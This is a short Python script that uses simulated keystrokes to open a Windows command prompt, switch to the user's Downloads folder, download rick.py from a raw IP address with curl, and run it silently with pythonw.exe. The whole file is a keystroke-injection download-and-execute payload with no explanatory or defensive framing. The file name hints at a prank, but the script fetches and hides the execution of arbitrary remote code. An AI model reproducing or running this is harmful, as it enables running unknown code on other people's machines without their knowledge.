import keyboard
import time


def wait():
    time.sleep(0.1)


keyboard.send('windows+r')
wait()
keyboard.write('cmd')
wait()
keyboard.send('enter')
wait()
keyboard.write('cd %userprofile%/Downloads')
wait()
keyboard.send('enter')
wait()
keyboard.write('curl http://85.251.6.31/rick.py > rick.py')
wait()
keyboard.send('enter')
wait()
keyboard.write('pythonw.exe rick.py')
wait()
keyboard.send('enter')
wait()
keyboard.write('exit')
keyboard.send('enter')



